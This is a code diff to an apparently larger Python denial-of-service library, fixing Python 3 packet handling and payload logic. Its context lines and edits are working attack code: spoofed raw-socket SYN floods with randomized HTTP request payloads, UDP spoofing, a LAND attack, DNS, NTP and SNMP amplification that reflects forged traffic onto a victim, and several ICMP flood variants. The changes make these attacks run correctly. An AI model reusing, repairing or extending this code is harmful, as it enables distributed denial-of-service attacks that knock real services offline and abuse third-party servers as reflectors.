@@ -1603,46 +1603,50 @@ class sflood(threading.Thread):
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     sp=random.randint(1024,65500)
-    if tcpf==True:
+    if paylo==False:
      urd=''
-     req='TCP'
-     for x in range(random.randint(1*amp,3*amp)):
-      urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
-     if len(urd)>1400:
-      urd=urd[0:1400]
+     req='None'
     else:
-     pths=random.choice(paths)
-     for l in range(random.randint(1,5)):
-      ed=random.choice(ec)
-      oi=random.randint(1,3)
-      if oi==2:
-       gy=0
-       while gy<1:
-         df=random.choice(ec)
-         if df!=ed:
-          gy+=1
-       ed+=', '
-       ed+=df
-      l=random.choice(al)
-      for n in range(random.randint(0,5)):
-       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
-      kl=random.randint(1,2)
-      if kl==1:
-       req="GET"
-       urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
-      else:
-       req="POST"
-       k=''
-       for _ in range(1,random.randint(2,5)):
-        k+=random.choice(lis)
-       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-       for _ in range(1,random.randint(1,3)):
-        k+=random.choice(lis)
-       j=''
-       for x in range(0,random.randint(11,31)):
-        j+=random.choice(lis)
-       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-       urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
+     if tcpf==True:
+      urd=''
+      req='TCP'
+      for x in range(random.randint(1*amp,3*amp)):
+       urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+      if len(urd)>1400:
+       urd=urd[0:1400]
+     else:
+      pths=random.choice(paths)
+      for l in range(random.randint(1,5)):
+       ed=random.choice(ec)
+       oi=random.randint(1,3)
+       if oi==2:
+        gy=0
+        while gy<1:
+          df=random.choice(ec)
+          if df!=ed:
+           gy+=1
+        ed+=', '
+        ed+=df
+       l=random.choice(al)
+       for n in range(random.randint(0,5)):
+        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
+       kl=random.randint(1,2)
+       if kl==1:
+        req="GET"
+        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
+       else:
+        req="POST"
+        k=''
+        for _ in range(1,random.randint(2,5)):
+         k+=random.choice(lis)
+        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+        for _ in range(1,random.randint(1,3)):
+         k+=random.choice(lis)
+        j=''
+        for x in range(0,random.randint(11,31)):
+         j+=random.choice(lis)
+        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
     leng=len(urd)
     urd=urd.encode('utf-8')
     p=random.randint(1,5) 
@@ -1662,8 +1666,6 @@ class sflood(threading.Thread):
     iphv = (4 << 4) + 5
     iph = pack('!BBHHHBBH4s4s' , iphv, 0, 0, random.randint(1,65535), 0, random.randint(minttl,maxttl), socket.IPPROTO_TCP, 0, ips, ipd)
     tcr = (5 << 4) + 0
-    if paylo==False:
-     urd=''
     tf = finf + (synf << 1) + (rstf << 2) + (pshf <<3) + (ackf << 4) + (urgf << 5)
     if winds=='null':
      windf=0
@@ -1682,7 +1684,7 @@ class sflood(threading.Thread):
     counter+=1
     if prints==True:
      print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(counter,sip,req,leng))
-   except:
+   except Exception as e:
     pass
    time.sleep(.1)
 def synflood(u,p=80,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,tcp=False,window="random",payloads=True,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
@@ -1796,9 +1798,7 @@ class udpsp(threading.Thread):
     packet = IP(ttl=random.randint(minttl,maxttl),src=sip, dst=target)/UDP(sport=random.randint(1024,65500),dport=port)/msg
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
@@ -1905,9 +1905,7 @@ class ln(threading.Thread):
     packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/msg
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
@@ -1975,17 +1973,15 @@ class dampli(threading.Thread):
     packet= IP(src=target, dst=ip) / UDP(sport=port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=query))
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,53))
     counter+=1
     if prints==True:
      print ("[!]Packets sent: {} | IP: {}".format(counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL'interval=300,logs=True,returning=False):
+    time.sleep(.1)
+def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',interval=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -2047,9 +2043,7 @@ class nampli(threading.Thread):
     packet=IP(src=target, dst=ip)/UDP(sport=port,dport=123)/Raw(load=data)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,123))
     counter+=1
     if prints==True:
@@ -2116,9 +2110,7 @@ class snampli(threading.Thread):
     packet=IP(src=target, dst=ip)/UDP(sport=port,dport=161)/Raw(load=data)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,161))
     counter+=1
     if prints==True:
@@ -2188,9 +2180,7 @@ class icmpcl(threading.Thread):
     packet=IP(ttl=random.randint(minttl,maxttl),dst=target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
@@ -2268,9 +2258,7 @@ class icmpst(threading.Thread):
     packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP()/data
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
@@ -2343,9 +2331,7 @@ class blnu(threading.Thread):
     packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP(type=3,code=3)
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    packet=str(packet)
-    if py3==True:
-     packet=packet.encode('utf-8')
+    packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
